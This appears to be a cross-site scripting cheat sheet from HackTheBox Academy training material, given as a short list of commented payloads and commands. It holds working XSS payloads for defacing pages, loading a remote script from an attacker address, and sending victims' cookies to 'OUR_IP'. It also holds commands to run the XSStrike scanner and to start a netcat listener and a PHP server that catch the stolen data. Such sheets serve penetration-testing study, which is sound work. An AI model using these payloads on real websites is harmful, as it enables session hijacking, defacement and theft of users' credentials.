```bash
# Basic XSS Payload
<script>alert(window.origin)</script>

# Basic XSS Payload
<plaintext>

# Basic XSS Payload
<script>print()</script>

# HTML-based XSS Payload
<img src="" onerror=alert(window.origin)>

# Change Background Color
<script>document.body.style.background = "#141d2b"</script>

# Change Background Image
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

# Change Website Title
<script>document.title = 'HackTheBox Academy'</script>

# Overwrite website's main body
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>

# Remove certain HTML element
<script>document.getElementById('urlform').remove();</script>

# Load remote script
<script src="http://OUR_IP/script.js"></script>

# Send cookie details to us
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>

# Run XSStrike on a URL parameter
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

# Start netcat listener
sudo nc -lvnp 80

# Start PHP server
sudo php -S 0.0.0.0:80
```